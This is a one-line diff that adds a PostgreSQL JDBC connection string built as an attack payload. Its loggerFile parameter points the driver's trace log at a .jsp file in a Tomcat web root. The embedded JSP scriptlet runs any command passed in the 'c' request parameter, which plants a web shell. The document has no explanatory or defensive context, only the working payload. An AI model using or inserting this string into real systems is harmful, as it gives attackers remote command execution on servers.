@@ -1,0 +1,1 @@
+jdbc:postgresql://host/db?loggerLevel=TRACE&loggerFile=/usr/local/tomcat/webapps/ROOT/shell.jsp&x=<%%20Runtime.getRuntime().exec(request.getParameter("c"));%20%>
